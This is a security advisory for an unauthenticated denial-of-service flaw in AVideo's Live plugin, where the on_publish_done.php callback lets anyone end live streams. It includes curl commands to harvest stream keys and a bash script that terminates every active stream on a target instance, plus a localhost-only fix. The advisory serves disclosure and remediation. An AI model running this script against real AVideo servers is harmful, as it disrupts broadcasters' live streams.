# [H] AVideo: Unauthenticated Live Stream Termination via RTMP Callback on_publish_done.php

## Summary
Severity: High
Advisory: GHSA-4jcg-jxpf-5vq3
CVE: CVE-2026-34731
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-4jcg-jxpf-5vq3
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo `on_publish_done.php` endpoint in the Live plugin allows unauthenticated users to terminate any active live stream. The endpoint processes RTMP callback events to mark streams as finished in the database, but performs no authentication or authorization checks before doing so.

An attacker can enumerate active stream keys from the unauthenticated `stats.json.php` endpoint, then send crafted POST requests to `on_publish_done.php` to terminate any live broadcast. This enables denial-of-service against all live streaming functionality on the platform.

## Details

The file `plugin/Live/on_publish_done.php` processes RTMP server callbacks when a stream ends. It accepts a POST parameter `name` (the stream key) and directly uses it to look up and terminate the corresponding stream session.

```php
// plugin/Live/on_publish_done.php
$row = LiveTransmitionHistory::getLatest($_POST['name'], $live_servers_id, 10);
$insert_row = LiveTransmitionHistory::finishFromTransmitionHistoryId($row['id']);
```

There is no authentication check anywhere in the file - no `User::isLogged()`, no `User::isAdmin()`, no token validation. The endpoint is designed to be called by the RTMP server (e.g., Nginx-RTMP), but since it is a standard HTTP endpoint, any external client can call it directly.

Additionally, stream keys can be harvested from the unauthenticated `stats.json.php` endpoint, which returns information about active streams including their keys.

## Proof of Concept

1. Retrieve active stream keys from the unauthenticated stats endpoint:

```bash
curl -s "https://your-avideo-instance.com/plugin/Live/stats.json.php" | python3 -m json.tool
```

2. Terminate a live stream by sending a POST request with the stream key:

```bash
curl -X POST "https://your-avideo-instance.com/plugin/Live/on_publish_done.php" \
  -d "name=STREAM_KEY_HERE"
```

3. The server responds with HTTP 200 and the stream is marked as finished in the `live_transmitions_history` table. The streamer's broadcast is terminated.

4. To disrupt all active streams, iterate over keys returned from step 1:

```bash
#!/bin/bash
# Terminate all active streams on a target AVideo instance
TARGET="https://your-avideo-instance.com"

curl -s "$TARGET/plugin/Live/stats.json.php" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for stream in data.get('applications', []):
    for client in stream.get('live', {}).get('streams', []):
        print(client.get('name', ''))
" | while read -r key; do
  [ -z "$key" ] && continue
  echo "[*] Terminating stream: $key"
  curl -s -X POST "$TARGET/plugin/Live/on_publish_done.php" -d "name=$key"
done
```

## Impact

Any unauthenticated attacker can terminate live broadcasts on an AVideo instance. This constitutes a denial-of-service vulnerability against the live streaming functionality. Combined with the unauthenticated stream key enumeration from `stats.json.php`, an attacker can systematically disrupt all active streams on the platform.

- **CWE-306**: Missing Authentication for Critical Function
- **Severity**: Medium

## Recommended Fix

Restrict the RTMP callback endpoint to localhost connections only at `plugin/Live/on_publish_done.php:3`:

```php
// plugin/Live/on_publish_done.php:3
if (!in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) {
    http_response_code(403);
    die('Forbidden');
}
```

Since this endpoint is designed to be called by the local RTMP server (e.g., Nginx-RTMP), it should only accept requests from localhost. External clients should never be able to invoke it directly.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-4jcg-jxpf-5vq3
- https://nvd.nist.gov/vuln/detail/CVE-2026-34731
- https://github.com/WWBN/AVideo/commit/e0b9e71f6f3b34f12ad78c1a69d4e1f584b49673
- https://github.com/WWBN/AVideo
